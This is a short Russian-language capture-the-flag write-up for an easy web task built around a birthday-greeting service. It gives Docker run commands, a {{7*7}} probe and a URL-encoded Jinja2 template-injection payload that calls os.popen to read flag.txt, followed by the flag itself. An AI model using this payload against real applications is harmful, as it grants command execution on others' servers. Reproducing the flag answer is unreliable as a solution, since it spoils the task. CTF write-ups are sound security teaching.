# Happy birthdays TTI

## Описание

**Easy**

Автор написал простенький сервис для поздравления с днём рождения, но безопасность сильно страдает

https://web3.krductf.ru/

Автор: **nik_kir1**

## Публикация

Поднять докер 
docker build -t name .
docker run -d -p 5000:5000 name

## Решение
проверить {{7*7}}

нагрузка:
%7B%7B+config.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27cat+flag.txt%27).read()+%7D%7D


## Ответ

krdu{SSTI_vulnerability_exploited!}